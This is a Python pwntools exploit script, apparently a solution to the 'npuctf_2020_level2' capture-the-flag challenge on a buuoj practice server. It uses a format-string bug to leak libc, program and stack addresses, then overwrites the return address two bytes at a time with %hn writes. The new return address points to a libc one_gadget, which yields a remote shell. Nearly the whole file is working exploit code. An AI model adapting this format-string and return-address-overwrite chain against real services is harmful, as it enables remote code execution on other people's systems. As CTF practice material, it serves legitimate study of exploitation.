from pwn import *

#context.log_level = 'debug'

#p = process('./npuctf_2020_level2')
p = remote('node4.buuoj.cn', 28827)
elf = ELF('npuctf_2020_level2')

libc = ELF('libc-2.27.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

sn(b'%7$p,,%11$p,,%9$p')

libc_base = int(p.recvuntil(b',,')[-16:-2], 16) - libc.sym['__libc_start_main'] - 231
proc_base = int(p.recvuntil(b',,')[-16:-2], 16) - elf.sym['main']
rbp = int(p.recv(14), 16) - ( 0xf8 - 0x10 )

success('libc_base -> {}'.format(hex(libc_base + libc.sym['system'])))
success('proc_base -> {}'.format(hex(proc_base)))
success('rbp -> {}'.format(hex(rbp)))

pop_rdi_ret = 0x893 + proc_base
ret = 0x626 + proc_base
leave_ret = 0x34d33 + libc_base

one_gadgets = [0x4f365, 0x4f3c2, 0x10a45c]
one_gadgets_buu = [0x4f2c5, 0x4f322, 0x10a38c]
one = libc_base + one_gadgets_buu[1]

ret_addr = rbp + 0x8

def editTarget(addr, val):
    payload = '%' + str((rbp + 0x48) & 0xffff) + 'c%9$hnqwq'
    sn(payload.encode())
    ru(b'qwq')
    payload = '%' + str(addr & 0xffff) + 'c%35$hnqwq'
    sn(payload.encode())
    ru(b'qwq')

    payload = '%' + str(val & 0xffff) + 'c%15$hnqwq'
    sn(payload.encode())
    ru(b'qwq')

    payload = '%' + str((addr + 2) & 0xffff) + 'c%35$hnqwq'
    sn(payload.encode())
    ru(b'qwq')

    payload = '%' + str((val & 0xffff0000) >> 16) + 'c%15$hnqwq'
    sn(payload.encode())
    ru(b'qwq')

    payload = '%' + str((addr + 4) & 0xffff) + 'c%35$hnqwq'
    sn(payload.encode())
    ru(b'qwq')

    payload = '%' + str((val & 0xffff00000000) >> 32) + 'c%15$hnqwq'
    sn(payload.encode())
    ru(b'qwq')

#debug('b *$rebase(0x80c)')
editTarget(ret_addr, one)

sn(b'66666666\x00')
p.interactive()